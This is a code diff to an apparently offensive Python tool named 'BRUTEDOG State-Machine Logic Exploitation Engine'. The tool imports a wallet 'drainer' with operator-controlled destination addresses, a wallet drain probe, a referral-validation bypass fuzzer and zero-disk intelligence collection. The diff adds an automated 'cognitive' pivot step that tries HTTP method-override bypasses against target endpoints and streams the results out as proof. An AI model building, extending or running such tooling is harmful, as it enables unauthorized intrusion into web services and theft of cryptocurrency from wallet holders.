@@ -12,6 +12,7 @@ Features:
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
 - Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
 - Automated Referral Validation Gateway Fuzzing Integration (test_referral.py)
+- Autonomous Cognitive Reasoning Operator integration for live tactical pivoting & error analysis
 - Zero-disk in-memory intelligence collection & live telemetry streaming
 """
 import asyncio
@@ -37,8 +38,9 @@ from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
 from modules.wallet_drain_probe import execute_probe
 from modules.telemetry import stream_proof
 
-# Import the referral validation bypass probe
+# Import the referral validation bypass probe & Autonomous Cognitive Brain
 from modules.test_referral import audit_referral_logic
+from modules.cognitive_operator import CognitiveOperator
 
 # ============================================================
 # CONFIGURATION
@@ -99,6 +101,7 @@ YELLOW = "\033[93m"
 RED = "\033[91m"
 RESET = "\033[0m"
 BOLD = "\033[1m"
+MAGENTA = "\033[95m"
 
 def info(message):
     sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
@@ -119,6 +122,9 @@ def error(message):
 def section(title):
     sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
     sys.stdout.flush()
+
+# Initialize the Cognitive Reasoning Brain globally for the engine session
+cognitive_brain = CognitiveOperator()
 
 # ============================================================
 # TARGET HANDLING
@@ -146,7 +152,7 @@ def resolve_target(host):
         return []
 
 # ============================================================
-# ADAPTIVE RESPONSE ANALYSIS & LIVE TELEMETRY
+# ADAPTIVE RESPONSE ANALYSIS & COGNITIVE TELEMETRY
 # ============================================================
 def detect_database_errors(body):
     findings = []
@@ -169,7 +175,7 @@ def inspect_cookie_security(headers):
         issues.append("SameSite attribute missing")
     return issues
 
-def classify_and_adapt(response, current_payload, endpoint="", fingerprinter=None):
+def classify_and_adapt(response, current_payload, endpoint="", transport=None, fingerprinter=None):
     status = response.get("status", 0)
     body = response.get("body", "")
     headers = response.get("headers", {})
@@ -181,6 +187,31 @@ def classify_and_adapt(response, current_payload, endpoint="", fingerprinter=Non
         if is_fp:
             return [], []
     
+    # Run the response through the Cognitive Reasoning Operator
+    cognitive_insight = cognitive_brain.analyze_response(endpoint, status, headers, body)
+    if cognitive_insight.get("suggested_action") != "CONTINUE_STANDARD_CRAWL":
+        sys.stdout.write(f"\n{MAGENTA}[COGNITIVE BRAIN] Tactical Pivot Triggered: {cognitive_insight['suggested_action']}{RESET}\n")
+        sys.stdout.write(f"  └── Reasoning: {CYAN}{cognitive_insight['reasoning']}{RESET}\n")
+        
+        # Execute automated cognitive pivot if transport is available
+        if transport and cognitive_insight["suggested_action"] == "HTTP_METHOD_OVERRIDE":
+            override_headers = dict(transport.headers) if hasattr(transport, 'headers') else {}
+            override_headers.update({"X-HTTP-Method-Override": "GET"})
+            sys.stdout.write(f"  └── {YELLOW}[*] Executing cognitive HTTP method override probe against {endpoint}...{RESET}\n")
+            
+            try:
+                retry_status, _, retry_body = transport.request("GET", endpoint)
+                if retry_status in [200, 201]:
+                    success(f"[!!!] COGNITIVE PIVOT SUCCESSFUL! Method restriction bypassed on {endpoint} [HTTP {retry_status}]")
+                    stream_proof("COGNITIVE_METHOD_BYPASS", endpoint, current_payload, retry_body, {"bypass_status": retry_status})
+                    findings.append({
+                        "type": "COGNITIVE_METHOD_OVERRIDE_SUCCESS",
+                        "evidence": f"Successfully bypassed method restriction on {endpoint}",
+                        "status": retry_status
+                    })
+            except Exception as e:
+                warning(f"Cognitive pivot request error: {e}")
+
     # Strict SPA Shell Defense: Ignore generic client-side React/Next.js router shells
     is_spa_shell = (
         "<div id=\"root\"></div>" in body or 
@@ -286,7 +317,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
             continue
             
         res_obj = {"status": status, "headers": headers, "body": body}
-        findings, dynamic_mutations = classify_and_adapt(res_obj, current_test["payload"], endpoint=endpoint, fingerprinter=fingerprinter)
+        findings, dynamic_mutations = classify_and_adapt(res_obj, current_test["payload"], endpoint=endpoint, transport=transport, fingerprinter=fingerprinter)
         
         if findings:
             results.append({
@@ -309,7 +340,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.5")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.5 (COGNITIVE)")
     try:
         if target_host:
             target_url = target_host.strip()
